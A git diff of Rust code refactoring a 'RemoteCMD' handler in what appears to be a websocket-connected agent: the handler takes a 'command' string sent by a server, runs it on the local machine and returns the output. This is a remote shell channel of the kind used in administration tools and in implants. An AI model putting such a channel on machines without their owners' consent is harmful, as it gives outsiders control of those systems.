@@ -1,19 +1,19 @@
-use futures_util::SinkExt;
-use serde_json::Value;
 use std::process::Command;
 use tokio_tungstenite::tungstenite::Message;
 
 use crate::{
+    actors::{Actor, Command as ACommand, HandlerResult, WsMessageSender},
     dev_print,
-    handlers::func::{Function, HandlerResult},
-    router::SocketWriter,
 };
 
 pub struct RemoteCMD;
 
 #[async_trait::async_trait]
-impl Function for RemoteCMD {
-    async fn handler<'a>(args: Value, socket: &'a mut SocketWriter) -> HandlerResult {
+impl Actor for RemoteCMD {
+    fn new() -> Self {
+        Self
+    }
+    async fn handler(&mut self, args: ACommand, writer: WsMessageSender) -> HandlerResult {
         let cmd = args["command"].as_str().unwrap_or_default();
 
         #[cfg(target_os = "windows")]
@@ -40,7 +40,7 @@ impl Function for RemoteCMD {
             }
         };
 
-        socket.send(Message::Text(response_str)).await?;
+        writer.send(Message::Text(response_str)).await?;
         dev_print!("Response sent to server.");
 
         Ok(())
